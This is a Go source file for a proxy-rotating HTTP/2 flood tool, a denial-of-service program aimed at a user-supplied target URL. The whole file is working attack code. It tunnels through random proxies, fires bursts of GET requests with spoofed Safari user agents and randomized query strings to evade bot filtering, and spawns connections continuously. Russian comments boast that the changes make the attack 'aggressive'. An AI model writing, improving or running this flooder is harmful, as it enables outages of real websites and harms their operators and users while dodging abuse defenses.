package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

var (
	target     string
	duration   int
	rate       int
	threads    int
	proxyFile  string
	pathFlag   bool
	proxies    []string
	parsedURL  *url.URL
)

const userAgents = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15
Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1`

var (
	userAgentsList []string
	fetchSites     = []string{"none", "same-origin", "same-site", "cross-site"}
	languages      = []string{"en-US", "en-GB", "de", "fr", "es", "ru", "ja"}
)

func init() {
	rand.Seed(time.Now().UnixNano())
	userAgentsList = strings.Split(strings.TrimSpace(userAgents), "\n")
}

func main() {
	flag.StringVar(&target, "target", "", "Target URL")
	flag.IntVar(&duration, "time", 60, "Duration in seconds")
	flag.IntVar(&rate, "rate", 100, "Requests per second")
	flag.IntVar(&threads, "threads", 10, "Number of threads")
	flag.StringVar(&proxyFile, "proxy", "", "Proxy file path")
	flag.BoolVar(&pathFlag, "path", false, "Randomize path")
	flag.Parse()

	if target == "" || proxyFile == "" {
		fmt.Println("Usage: -target=https://example.com -time=60 -rate=100 -threads=10 -proxy=proxy.txt [-path]")
		os.Exit(1)
	}

	var err error
	parsedURL, err = url.Parse(target)
	if err != nil {
		fmt.Printf("Invalid URL: %v\n", err)
		os.Exit(1)
	}

	proxies, err = readLines(proxyFile)
	if err != nil {
		fmt.Printf("Error reading proxy file: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Target: %s\n", target)
	fmt.Printf("[*] Duration: %d sec\n", duration)
	fmt.Printf("[*] Rate: %d req/sec\n", rate)
	fmt.Printf("[*] Threads: %d\n", threads)

	var wg sync.WaitGroup
	stopChan := make(chan bool)

	// MODIFIED: Теперь каждый поток постоянно спавнит новые соединения в неблокирующем режиме
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stopChan:
					return
				default:
					// MODIFIED: Запуск runFlooder в отдельной горутине делает атаку агрессивной
					go runFlooder(stopChan)
					// Минимальная задержка, чтобы не забить локальную память раньше времени
					time.Sleep(5 * time.Millisecond) 
				}
			}
		}()
	}

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()
	fmt.Println("\n[*] Done")
}

func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func randomInt(min, max int) int {
	return min + rand.Intn(max-min+1)
}

func randomElement(arr []string) string {
	return arr[rand.Intn(len(arr))]
}

func randomString(length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func buildPath() string {
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}
	if pathFlag {
		path += fmt.Sprintf("?%s=%d", randomString(12), randomInt(100000, 999999))
	}
	return path
}

func connectProxy(proxyAddr, targetHost string) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxyAddr, 10*time.Second)
	if err != nil {
		return nil, err
	}

	connectReq := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nConnection: Keep-Alive\r\n\r\n", targetHost, targetHost)
	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, err
	}

	reader := bufio.NewReader(conn)
	resp, err := reader.ReadString('\n')
	if err != nil || !strings.Contains(resp, "200") {
		conn.Close()
		return nil, fmt.Errorf("proxy failed")
	}

	for {
		line, _ := reader.ReadString('\n')
		if line == "\r\n" || line == "\n" {
			break
		}
	}

	return conn, nil
}

func runFlooder(stopChan chan bool) {
	proxyAddr := randomElement(proxies)
	proxyConn, err := connectProxy(proxyAddr, parsedURL.Host)
	if err != nil {
		return
	}

	tlsConfig := &tls.Config{
		ServerName:         parsedURL.Host,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		// FIXED: Добавлены настройки для имитации TLS Safari/Chrome
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
	}

	tlsConn := tls.Client(proxyConn, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		proxyConn.Close()
		return
	}

	transport := &http2.Transport{
		TLSClientConfig: tlsConfig,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   20 * time.Second,
	}

	// MODIFIED: Убран блокирующий вызов. Теперь флуд идет параллельно.
	floodWithClient(client, stopChan, tlsConn)
}

func floodWithClient(client *http.Client, stopChan chan bool, conn net.Conn) {
	// MODIFIED: Увеличено время жизни соединения до 60 сек, чтобы оно успело нафлудить
	timeout := time.After(60 * time.Second)

	go func() {
		defer conn.Close()
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-stopChan:
				return
			case <-timeout:
				return
			case <-ticker.C:
				// MODIFIED: Асинхронная отправка пакета запросов
				for i := 0; i < rate; i++ {
					go sendRequest(client)
				}
			}
		}
	}()
}

func sendRequest(client *http.Client) {
	path := buildPath()
	reqURL := fmt.Sprintf("https://%s%s", parsedURL.Host, path)

	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return
	}

	req.Header.Set("User-Agent", randomElement(userAgentsList))
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", randomElement(languages))
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", randomElement(fetchSites))

	resp, err := client.Do(req)
	if err != nil {
		return
	}

	if resp.Body != nil {
		// FIXED: Быстрое чтение и закрытие тела для освобождения ресурсов
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}
